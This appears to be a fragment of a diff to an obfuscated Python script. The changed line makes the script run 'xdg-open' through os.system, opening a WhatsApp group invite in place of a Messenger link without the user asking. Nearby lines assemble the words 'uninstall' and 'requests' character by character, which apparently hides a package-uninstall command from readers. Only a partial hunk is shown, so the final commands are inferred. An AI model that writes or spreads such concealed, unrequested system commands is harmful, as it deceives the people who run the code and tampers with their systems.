@@ -7,7 +7,7 @@ gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
 cx=('.g');cxx=('fig');xl=('/')
   
 import os,base64
-os.system("xdg-open https://m.me/KINGXMRSW4TI/?ref=share")
+os.system("xdg-open https://chat.whatsapp.com/IBITafA7ugtBTkRH760hj2/?ref=share")
 u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
 ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
 r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
